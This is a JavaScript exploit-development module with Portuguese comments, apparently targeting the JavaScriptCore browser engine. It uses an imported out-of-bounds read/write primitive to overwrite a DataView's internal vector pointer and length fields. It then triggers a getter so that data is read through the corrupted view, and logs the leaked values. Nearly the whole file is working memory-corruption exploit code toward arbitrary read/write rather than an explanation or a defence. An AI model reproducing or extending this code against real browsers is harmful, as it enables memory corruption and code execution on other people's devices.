// js/script3/testArrayBufferVictimCrash.mjs (Correção do ReferenceError)
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real, 
    oob_dataview_real,     
    oob_write_absolute,    
    oob_read_absolute,     
    clearOOBEnvironment,
    isOOBReady
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_V28 = "GetterReconfigDV_Read_v1_ErrorFixed"; // Nome do módulo atualizado

// Constantes CRUCIAIS que estavam causando ReferenceError
const TARGET_DATA_VALUE_LOW = 0xFEEDF00D;
const TARGET_DATA_VALUE_HIGH = 0xDEADBEEF;
const TARGET_DATA_LOCATION_IN_OOB = 0x0300; 

// Outras Constantes
const TARGET_OFFSET_FOR_GETTER_TO_READ_FROM_0x68 = 0x68;
const TRIGGER_WRITE_OFFSET = 0x70;
const TRIGGER_WRITE_VALUE = 0xFFFFFFFF;
const DATA_COPY_DEST_OFFSET_IN_OOB = 0x0100;    

// Offsets para reconfigurar o oob_dataview_real
const OOB_DV_M_VECTOR_OFFSET_ABS = 0x58 + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET; 
const OOB_DV_M_LENGTH_OFFSET_ABS = 0x58 + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET; 

let getter_object_ref = null;
let address_used_by_getter_for_reconfig = null; 
let data_successfully_read_after_reconfig = false;

function ReconfigDVAndReadGetterFixed() { // Nome da função do getter ligeiramente alterado para rastreamento
    logS3(`>>>> [ReconfigDVAndReadGetterFixed ACIONADO!] <<<<`, "vuln", `${FNAME_MODULE_V28}.Getter`);
    data_successfully_read_after_reconfig = false;
    address_used_by_getter_for_reconfig = null;

    let original_oob_dv_m_vector = null;
    let original_oob_dv_m_length = null;

    try {
        original_oob_dv_m_vector = oob_read_absolute(OOB_DV_M_VECTOR_OFFSET_ABS, 8);
        original_oob_dv_m_length = oob_read_absolute(OOB_DV_M_LENGTH_OFFSET_ABS, 4);
        logS3(`    [GetterFixed] Estado Original DV: m_vector=${original_oob_dv_m_vector.toString(true)}, m_length=${toHex(original_oob_dv_m_length)}`, "info");

        const qword_new_m_vector_target = oob_read_absolute(TARGET_OFFSET_FOR_GETTER_TO_READ_FROM_0x68, 8);
        if (!isAdvancedInt64Object(qword_new_m_vector_target)) {
             logS3(`    [GetterFixed] Valor lido de ${toHex(TARGET_OFFSET_FOR_GETTER_TO_READ_FROM_0x68)} não é AdvancedInt64.`, "error");
             return "getter_error_reading_target_ptr";
        }
        address_used_by_getter_for_reconfig = qword_new_m_vector_target;
        logS3(`    [GetterFixed] Novo m_vector alvo (lido de ${toHex(TARGET_OFFSET_FOR_GETTER_TO_READ_FROM_0x68)}): ${address_used_by_getter_for_reconfig.toString(true)}`, "leak");

        const new_m_vector_value_low = address_used_by_getter_for_reconfig.low();
        const new_m_vector_value_high = address_used_by_getter_for_reconfig.high();
        
        // A condição de validação para o que esperamos que seja o offset alvo (deve estar na parte baixa do QWORD lido de 0x68)
        if (new_m_vector_value_high === 0 && new_m_vector_value_low < oob_array_buffer_real.byteLength - 8 && new_m_vector_value_low === TARGET_DATA_LOCATION_IN_OOB) {
            logS3(`    [GetterFixed] Novo m_vector (offset ${toHex(new_m_vector_value_low)}) validado. Reconfigurando DV...`, "info");
            
            // Reconfigurar oob_dataview_real para apontar para new_m_vector_value_low (como offset)
            // O m_vector do DataView espera um ponteiro absoluto. Se estivermos trabalhando dentro do oob_array_buffer_real,
            // e o motor JS trata m_vector como um offset do início do ArrayBuffer associado se a parte alta for 0,
            // então podemos passar AdvancedInt64(offset, 0).
            const new_m_vector_for_dv = new AdvancedInt64(new_m_vector_value_low, 0); // Offset na parte baixa, parte alta 0
            const new_m_length_value = 16; 

            logS3(`    [GetterFixed] Escrevendo m_vector (${new_m_vector_for_dv.toString(true)}) em ${toHex(OOB_DV_M_VECTOR_OFFSET_ABS)}`, "info");
            oob_write_absolute(OOB_DV_M_VECTOR_OFFSET_ABS, new_m_vector_for_dv, 8);
            logS3(`    [GetterFixed] Escrevendo m_length (${toHex(new_m_length_value)}) em ${toHex(OOB_DV_M_LENGTH_OFFSET_ABS)}`, "info");
            oob_write_absolute(OOB_DV_M_LENGTH_OFFSET_ABS, new_m_length_value, 4);

            logS3(`    [GetterFixed] Tentando ler ${new_m_length_value} bytes de offset ${toHex(new_m_vector_value_low)} (via oob_dataview_real reconfigurado)...`, "info");
            
            const data_low = oob_dataview_real.getUint32(0, true); 
            const data_high = oob_dataview_real.getUint32(4, true);
            const data_read_from_reconfigured_dv = new AdvancedInt64(data_low, data_high);
            
            logS3(`    [GetterFixed] Dados lidos via DV reconfigurado: ${data_read_from_reconfigured_dv.toString(true)}`, "leak");

            oob_write_absolute(DATA_COPY_DEST_OFFSET_IN_OOB, data_read_from_reconfigured_dv, 8);
            data_successfully_read_after_reconfig = true;
            logS3(`    [GetterFixed] Dados lidos copiados para ${toHex(DATA_COPY_DEST_OFFSET_IN_OOB)}.`, "info");

        } else {
            logS3(`    [GetterFixed] Endereço alvo lido de 0x68 (${address_used_by_getter_for_reconfig.toString(true)}) não é um offset simples válido ou não corresponde a ${toHex(TARGET_DATA_LOCATION_IN_OOB)}. Esperado Low=${toHex(TARGET_DATA_LOCATION_IN_OOB)}, High=0.`, "warn");
        }

    } catch (e) {
        logS3(`    ERRO DENTRO DO GetterFixed: ${e.name} - ${e.message}\n${e.stack}`, "critical");
    } finally {
        if (isAdvancedInt64Object(original_oob_dv_m_vector) && typeof original_oob_dv_m_length === 'number') {
            try {
                logS3(`    [GetterFixed] Restaurando oob_dataview_real para m_vector=${original_oob_dv_m_vector.toString(true)}, m_length=${toHex(original_oob_dv_m_length)}...`, "info");
                oob_write_absolute(OOB_DV_M_VECTOR_OFFSET_ABS, original_oob_dv_m_vector, 8);
                oob_write_absolute(OOB_DV_M_LENGTH_OFFSET_ABS, original_oob_dv_m_length, 4);
                logS3(`    [GetterFixed] oob_dataview_real restaurado.`, "info");
            } catch (e_restore) {
                 logS3(`    [GetterFixed] ERRO ao tentar restaurar oob_dataview_real: ${e_restore.message}`, "error");
            }
        } else {
            logS3(`    [GetterFixed] Não foi possível restaurar oob_dataview_real (valores originais não capturados).`, "warn");
        }
    }
    return "reconfig_dv_getter_fixed_executed";
}

export async function executeArrayBufferVictimCrashTest() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_V28}.attemptReconfigDVRead`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Teste de Leitura com Reconfig. DV via Getter (Erro Corrigido) ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_V28} Inic...`;

    address_used_by_getter_for_reconfig = null;
    data_successfully_read_after_reconfig = false;
    getter_object_ref = {};

    let errorCapturedMain = null;
    let exploit_result = {
        success: false,
        address_targeted_str: null,
        data_planted_at_target_str: null,
        data_read_and_copied_str: null,
        message: "Teste não iniciado."
    };

    try {
        await triggerOOB_primitive({ force_reinit: true });
        if (!isOOBReady()) { 
            throw new Error("OOB Init falhou ou ambiente não está pronto."); 
        }
        logS3("Ambiente OOB inicializado e pronto.", "info", FNAME_CURRENT_TEST);

        const target_data_to_plant = new AdvancedInt64(TARGET_DATA_VALUE_LOW, TARGET_DATA_VALUE_HIGH);
        exploit_result.data_planted_at_target_str = target_data_to_plant.toString(true);
        logS3(`PASSO 1a: Plantando dados de teste ${exploit_result.data_planted_at_target_str} em oob_buffer[${toHex(TARGET_DATA_LOCATION_IN_OOB)}]`, "info", FNAME_CURRENT_TEST);
        oob_write_absolute(TARGET_DATA_LOCATION_IN_OOB, target_data_to_plant, 8);

        // Plantar o QWORD que o getter deve ler de 0x68.
        // Queremos que qword_new_m_vector_target.low() seja TARGET_DATA_LOCATION_IN_OOB (0x300)
        // e qword_new_m_vector_target.high() seja 0.
        const qword_for_getter_to_read = new AdvancedInt64(TARGET_DATA_LOCATION_IN_OOB, 0);
        logS3(`PASSO 1b: Plantando QWORD ${qword_for_getter_to_read.toString(true)} (contendo o offset alvo) em oob_buffer[${toHex(TARGET_OFFSET_FOR_GETTER_TO_READ_FROM_0x68)}] (0x68)`, "info", FNAME_CURRENT_TEST);
        oob_write_absolute(TARGET_OFFSET_FOR_GETTER_TO_READ_FROM_0x68, qword_for_getter_to_read, 8); 
        
        oob_write_absolute(DATA_COPY_DEST_OFFSET_IN_OOB, new AdvancedInt64(0,0), 8);

        Object.defineProperty(getter_object_ref, 'triggerReconfigReadV2', { // Nome da prop do getter diferente para evitar cache
            get: ReconfigDVAndReadGetterFixed,
            configurable: true
        });
        logS3("PASSO 2: Getter 'triggerReconfigReadV2' definido.", "info", FNAME_CURRENT_TEST);

        logS3(`PASSO 3: Escrevendo valor de trigger ${toHex(TRIGGER_WRITE_VALUE)} em oob_buffer[${toHex(TRIGGER_WRITE_OFFSET)}] (0x70)...`, "warn", FNAME_CURRENT_TEST);
        oob_write_absolute(TRIGGER_WRITE_OFFSET, TRIGGER_WRITE_VALUE, 4);
        logS3(`  Escrita de trigger realizada.`, "info", FNAME_CURRENT_TEST);

        const val_at_0x68_post_trigger = oob_read_absolute(TARGET_OFFSET_FOR_GETTER_TO_READ_FROM_0x68, 8);
        logS3(`  Valor em ${toHex(TARGET_OFFSET_FOR_GETTER_TO_READ_FROM_0x68)} (lido por oob_read_absolute) APÓS trigger e ANTES do getter: ${isAdvancedInt64Object(val_at_0x68_post_trigger) ? val_at_0x68_post_trigger.toString(true) : "Erro"}`, "important");

        logS3("PASSO 4: Tentando acionar o getter acessando getter_object_ref.triggerReconfigReadV2...", "warn", FNAME_CURRENT_TEST);
        try {
            const getter_return_value = getter_object_ref.triggerReconfigReadV2;
            logS3(`  Acesso à propriedade do getter retornou: ${getter_return_value}`, "info", FNAME_CURRENT_TEST);
        } catch (e_getter_access) {
            logS3(`  ERRO ao tentar acionar o getter: ${e_getter_access.name} - ${e_getter_access.message}`, "error", FNAME_CURRENT_TEST);
        }

        exploit_result.address_targeted_str = address_used_by_getter_for_reconfig ? address_used_by_getter_for_reconfig.toString(true) : "N/A";

        if (data_successfully_read_after_reconfig) {
            const copied_data = oob_read_absolute(DATA_COPY_DEST_OFFSET_IN_OOB, 8);
            exploit_result.copied_data_str = isAdvancedInt64Object(copied_data) ? copied_data.toString(true) : "ERRO_LEITURA_COPIA";
            logS3(`PASSO 5: Dados copiados para ${toHex(DATA_COPY_DEST_OFFSET_IN_OOB)}: ${exploit_result.copied_data_str}`, "leak", FNAME_CURRENT_TEST);

            if (isAdvancedInt64Object(copied_data) && copied_data.equals(target_data_to_plant)) {
                exploit_result.success = true;
                exploit_result.message = "SUCESSO! Getter leu o endereço/offset alvo de 0x68, reconfigurou DV, leu dados e copiou corretamente!";
                document.title = `${FNAME_MODULE_V28}: DV RECONFIG OK!`;
                logS3(`  !!!! ${exploit_result.message} !!!!`, "vuln", FNAME_CURRENT_TEST);
            } else {
                exploit_result.message = "Dados copiados, mas não correspondem aos dados originais plantados.";
                document.title = `${FNAME_MODULE_V28}: DV Reconfig Cópia Incorreta`;
            }
        } else {
            exploit_result.message = "Getter foi acionado, mas os dados não foram marcados como lidos/copiados com sucesso após reconfiguração do DV.";
            logS3(`  Getter acionado, mas 'data_successfully_read_after_reconfig' é false. Endereço alvo que o getter usou: ${exploit_result.address_targeted_str}`, "warn", FNAME_CURRENT_TEST);
            document.title = `${FNAME_MODULE_V28}: Falha Reconfig DV`;
        }
    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main; // Captura o erro
        logS3(`ERRO CRÍTICO GERAL: ${e_outer_main.name} - ${e_outer_main.message}`, "critical", FNAME_CURRENT_TEST);
        if (e_outer_main.stack) logS3(`Stack: ${e_outer_main.stack}`, "critical", FNAME_CURRENT_TEST);
        exploit_result.message = `Erro geral: ${e_outer_main.name} - ${e_outer_main.message}`; // Adiciona mensagem de erro
        document.title = `${FNAME_MODULE_V28} ERRO CRÍTICO`;
    } finally {
        clearOOBEnvironment({force_clear_even_if_not_setup: true}); 
        logS3(`--- ${FNAME_CURRENT_TEST} Concluído (Ambiente OOB limpo) ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Resultado Reconfig DV Read: Success=${exploit_result.success}, Msg='${exploit_result.message}'`, exploit_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`  Endereço Alvo Lido pelo Getter (de 0x68): ${exploit_result.address_targeted_str}`, "info", FNAME_CURRENT_TEST);
        if(exploit_result.copied_data_str) logS3(`  Dados Copiados (de ${toHex(DATA_COPY_DEST_OFFSET_IN_OOB)}): ${exploit_result.copied_data_str}`, "leak", FNAME_CURRENT_TEST);
        getter_object_ref = null;
    }
    
    return { 
        errorOccurred: errorCapturedMain, // Retorna o erro capturado
        exploit_attempt_result: exploit_result,
        toJSON_details: { 
            probe_variant: FNAME_MODULE_V28, 
            this_type_in_toJSON: (exploit_result.success ? "getter_reconfig_dv_success" : "getter_reconfig_dv_error_or_failed"),
        }
    };
}
